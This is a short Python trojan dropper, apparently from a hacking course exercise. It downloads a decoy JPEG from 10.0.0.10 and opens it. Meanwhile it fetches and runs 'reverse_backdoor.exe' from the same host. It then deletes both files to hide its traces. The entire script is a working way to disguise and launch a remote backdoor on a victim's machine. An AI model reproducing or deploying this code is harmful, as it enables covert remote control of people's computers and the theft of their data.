#!/usr/bin/env python

import requests, os, subprocess, tempfile




def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("http://10.0.0.10/fiat124_turbo.jpeg")
subprocess.Popen("fiat124_turbo.jpeg", shell=True)
download("http://10.0.0.10/reverse_backdoor.exe")
subprocess.call("reverse_backdoor.exe", shell=True)

os.remove("fiat124_turbo.jpeg")
os.remove("reverse_backdoor.exe")
